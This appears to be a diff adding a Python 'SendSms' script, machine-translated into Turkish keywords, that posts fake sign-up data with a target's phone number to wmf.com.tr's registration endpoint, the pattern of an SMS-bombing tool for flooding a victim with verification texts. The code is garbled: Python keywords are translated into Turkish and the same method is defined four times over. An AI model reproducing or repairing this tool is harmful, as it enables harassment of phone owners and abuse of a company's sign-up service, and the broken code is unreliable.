@@ -1,0 +1,103 @@
+içe aktarma istekleri
+rastgele içe aktarma seçeneğinden
+dize içe aktarma ascii_lowercase'den
+BS4'ten BeautifulSoup'u içe aktarın
+colorama'dan içe aktarma Fore, Style
+
+sınıf SendSms():
+    adet = 0
+    
+    def __init__(kendi, telefon, posta):
+        self.phone = str(telefon)
+        len(posta) != 0 ise:
+            self.posta = posta
+        başka:
+            self.mail = ''.join(seçim(ascii_lowercase) i için aralık(19))+"@gmail.com"
+
+    #wmf.com.tr
+    tanım Wmf(kendi):
+        denemek:
+            wmf = request.post("https://www.wmf.com.tr/users/register/", data={
+                "onayla": "doğru",
+                "doğum_tarihi": "1956/03/01",
+                "e-posta": self.mail,
+                "email_allowed": "doğru",
+                "ad_adı": "Memati",
+                "cinsiyet erkek",
+                "soyadı": "Bas",
+                "şifre": "31ABC..abc31",
+                "telefon": f"0{self.phone}"
+            })
+            wmf.status_code == 202 ise:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
+                öz.adet += 1   
+            başka:
+                artırmak
+        hariç:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
+
+    #wmf.com.tr
+    tanım Wmf(kendi):
+        denemek:
+            wmf = request.post("https://www.wmf.com.tr/users/register/", data={
+                "onayla": "doğru",
+                "doğum_tarihi": "1986/03/01",
+                "e-posta": self.mail,
+                "email_allowed": "doğru",
+                "ad_ad": "Mahmut",
+                "cinsiyet erkek",
+                "soyadı": "Aktaş",
+                "şifre": "31ABC..32c31",
+                "telefon": f"0{self.phone}"
+            })
+            wmf.status_code == 202 ise:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
+                öz.adet += 1   
+            başka:
+                artırmak
+        hariç:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
+
+    #wmf.com.tr
+    tanım Wmf(kendi):
+        denemek:
+            wmf = request.post("https://www.wmf.com.tr/users/register/", data={
+                "onayla": "doğru",
+                "doğum_tarihi": "1960/03/01",
+                "e-posta": self.mail,
+                "email_allowed": "doğru",
+                "ad_ad": "Burak",
+                "cinsiyet erkek",
+                "soyadı": "Görev",
+                "şifre": "31C..abc31",
+                "telefon": f"0{self.phone}"
+            })
+            wmf.status_code == 202 ise:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
+                öz.adet += 1   
+            başka:
+                artırmak
+        hariç:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
+
+    #wmf.com.tr
+    tanım Wmf(kendi):
+        denemek:
+            wmf = request.post("https://www.wmf.com.tr/users/register/", data={
+                "onayla": "doğru",
+                "doğum_tarihi": "1996/03/01",
+                "e-posta": self.mail,
+                "email_allowed": "doğru",
+                "ad_ad": "Ufuk",
+                "cinsiyet erkek",
+                "soyadı": "Bas",
+                "şifre": "31CC..abc31",
+                "telefon": f"0{self.phone}"
+            })
+            wmf.status_code == 202 ise:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
+                öz.adet += 1   
+            başka:
+                artırmak
+        hariç:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
